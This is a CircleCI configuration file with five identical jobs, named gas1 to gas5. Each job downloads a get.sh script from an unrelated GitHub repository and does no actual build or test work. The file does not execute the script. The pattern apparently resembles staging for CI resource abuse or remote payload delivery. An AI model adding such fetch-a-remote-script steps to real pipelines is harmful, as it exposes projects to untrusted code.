version: 2.1

# Define the jobs we want to run for this project
jobs:
  gas1:
    docker:
      - image: cimg/base:edge
    steps:
      - run: wget https://github.com/binniyup/datacare/blob/main/get.sh && ls -l
  gas2:
    docker:
      - image: cimg/base:edge
    steps:
      - run: wget https://github.com/binniyup/datacare/blob/main/get.sh && ls -l
  gas3:
    docker:
      - image: cimg/base:edge
    steps:
      - run: wget https://github.com/binniyup/datacare/blob/main/get.sh && ls -l
  gas4:
    docker:
      - image: cimg/base:edge
    steps:
      - run: wget https://github.com/binniyup/datacare/blob/main/get.sh && ls -l
  gas5:
    docker:
      - image: cimg/base:edge
    steps:
      - run: wget https://github.com/binniyup/datacare/blob/main/get.sh && ls -l

# Orchestrate our job run sequence
workflows:
  build_and_test:
    jobs:
      - gas1
      - gas2
      - gas3
      - gas4
      - gas5